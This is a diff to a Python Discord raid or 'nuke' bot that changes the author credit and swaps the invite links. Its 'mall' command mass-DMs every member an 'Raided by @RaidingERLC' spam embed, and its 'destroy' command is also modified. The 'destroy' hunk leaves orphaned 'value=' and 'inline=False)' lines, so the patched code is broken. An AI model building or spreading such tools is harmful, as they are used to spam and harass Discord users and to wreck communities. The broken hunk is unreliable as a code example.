@@ -1,4 +1,4 @@
-#Made by Social404
+#Made by Misterfergie
 from config import prefix
 from config import token
 import keep_alive
@@ -95,11 +95,11 @@ async def mall(ctx):
     for member in list(client.get_all_members()):
         await asyncio.sleep(0)
         try:
-            embed = discord.Embed(title="Raided by @RaidingERLC", url="https://discord.gg/aeuh2Tuv", description="@everyone" , color=discord.Colour.purple())
+            embed = discord.Embed(title="Raided by @RaidingERLC", url="https://discord.gg/aeuh2Tuv0", description="@everyone" , color=discord.Colour.purple())
             embed.add_field(
                 name="Discord Server",
                 value=
-                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
+                "[ [ Click here ] ](https://discord.gg/aeuh2Tuv)",
                 inline=False)
             embed.add_field(
                 name="free leaks",
@@ -109,10 +109,9 @@ async def mall(ctx):
             embed.add_field(
                 name="GitHub",
                 value=
-                "[ [ Click here ] ](https://github.com/social404)",
+                "[ [ Click here ] ](https://discord.gg/aeuh2Tuv)",
                 inline=False)
-            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
-            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
+            embed.set_thumbnail(url="")
             await member.send(embed=embed)
         except:
             pass
@@ -124,11 +123,7 @@ async def mall(ctx):
 async def destroy(ctx):
     await ctx.message.delete()
     for member in list(client.get_all_members()): 
-        await asyncio.sleep(0)
-        try:
-            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
-            embed.add_field(
-                name="Discord Server",
+        
                 value=
                 "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
                 inline=False)
